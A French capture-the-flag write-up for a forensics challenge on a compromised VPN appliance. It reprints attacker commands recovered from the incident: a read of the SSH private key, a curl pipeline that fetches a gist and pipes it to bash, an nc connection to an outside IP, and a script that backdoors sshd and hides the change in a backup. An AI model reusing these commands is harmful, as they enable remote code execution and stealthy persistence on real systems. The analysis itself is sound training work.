
https://hackropole.fr/fr/challenges/forensics/fcsc2024-forensics-horreur-malheur-4/

## Description

Vous venez d’être embauché en tant que Responsable de la Sécurité des Systèmes d’Information (RSSI) d’une entreprise stratégique.

En arrivant à votre bureau le premier jour, vous vous rendez compte que votre prédécesseur vous a laissé une clé USB avec une note dessus : `VPN compromis (intégrité). Version 22.3R1 b1647`.

---

Vous remarquez qu’une fonctionnalité _built-in_ de votre équipement ne fonctionne plus et vous vous demandez si l’attaquant n’a pas utilisé la première persistance pour en installer une seconde, moins “visible”…

Vous cherchez les caractéristiques de cette seconde persistance : protocole utilisé, port utilisé, chemin vers le fichier de configuration qui a été modifié, chemin vers le fichier qui a été modifié afin d’établir la persistance.

Le flag est au format : `FCSC{<protocole>:<port>:<chemin_absolu>:<chemin_absolu>}`.

Cette épreuve a été découpée en cinq parties :

- [Horreur, malheur 1/5 - Archive chiffrée](https://hackropole.fr/fr/challenges/forensics/fcsc2024-forensics-horreur-malheur-1/).
- [Horreur, malheur 2/5 - Accès initial](https://hackropole.fr/fr/challenges/forensics/fcsc2024-forensics-horreur-malheur-2/).
- [Horreur, malheur 3/5 - Simple persistance](https://hackropole.fr/fr/challenges/forensics/fcsc2024-forensics-horreur-malheur-3/).
- [Horreur, malheur 4/5 - Pas si simple persistance](https://hackropole.fr/fr/challenges/forensics/fcsc2024-forensics-horreur-malheur-4/).
- [Horreur, malheur 5/5 - Un peu de CTI](https://hackropole.fr/fr/challenges/forensics/fcsc2024-forensics-horreur-malheur-5/).
## Write Up

On ressort les commandes déchiffrés avant, je trouve qu'on ne les a pas assez poussé :
```tex
b'id'
b'ls /'
b'echo FCSC{6cd63919125687a10d32c4c8dd87a5d0c8815409}'
b'cat /data/runtime/etc/ssh/ssh_host_rsa_key'
b'/home/bin/curl -k -s https://api.github.com/repos/joke-finished/2e18773e7735910db0e1ad9fc2a100a4/commits?per_page=50 -o /tmp/a'
b'cat /tmp/a | grep "name" | /pkg/uniq | cut -d ":" -f 2 | cut -d \'"\' -f 2 | tr -d \'\n\' | grep -o . | tac | tr -d \'\n\'  > /tmp/b'
b'a=`cat /tmp/b`;b=${a:4:32};c="https://api.github.com/gists/${b}";/home/bin/curl -k -s ${c} | grep \'raw_url\' | cut -d \'"\' -f 4 > /tmp/c'       
b'c=`cat /tmp/c`;/home/bin/curl -k ${c} -s | bash'
b'rm /tmp/a /tmp/b /tmp/c'
b'nc 146.0.228.66:1337'
```

On rejoue les commandes : 

Première commande :
```sh
curl -k -s https://api.github.com/repos/joke-finished/2e18773e7735910db0e1ad9fc2a100a4/commits?per_page=50 -o /tmp/a
```

Juste j'ai bidouillé la deuxième commande car ça ne marchait pas : 
```sh
cat /tmp/a | grep "name" | uniq | cut -d ":" -f 2 | sed 's/"//g' | grep -o . | tac | tr -d '\n' | sed 's/n//g' | tr -d ' ,' > /tmp/b
```

Et on bidouille la troisième commande :
```sh
a=`cat /tmp/b`;b=${a:4:32};c="https://api.github.com/gists/${b}";curl -k -s ${c} | grep 'raw_url'
```

Et hop, on a ce rendu :
![[Pasted image 20250212101748.png]]

Sur la page on arrive à ce script :
```bash
sed -i 's/port 830/port 1337/' /data/runtime/etc/ssh/sshd_server_config > /dev/null 2>&1
sed -i 's/ForceCommand/#ForceCommand/' /data/runtime/etc/ssh/sshd_server_config > /dev/null 2>&1
echo "PubkeyAuthentication yes" >> /data/runtime/etc/ssh/sshd_server_config
echo "AuthorizedKeysFile /data/runtime/etc/ssh/ssh_host_rsa_key.pub" >> /data/runtime/etc/ssh/sshd_server_config
pkill sshd-ive > /dev/null 2>&1
gzip -d /data/pkg/data-backup.tgz > /dev/null 2>&1
tar -rf /data/pkg/data-backup.tar /data/runtime/etc/ssh/sshd_server_config > /dev/null 2>&1
gzip /data/pkg/data-backup.tar > /dev/null 2>&1
mv /data/pkg/data-backup.tar.gz /data/pkg/data-backup.tgz > /dev/null 2>&1
```

On voit le port 1337, dès le début, Ensuite on remarque le fichier "/data/runtime/etc/ssh/sshd_server_config" est modifié, donc config ssh (on trouve le protocole ainsi)
Et à la fin on voit la backup modifié : /data/pkg/data-backup.tgz.

Le flag est donc **FCSC{ssh:1337:/data/runtime/etc/ssh/sshd_server_config:/data/pkg/data-backup.tgz}**.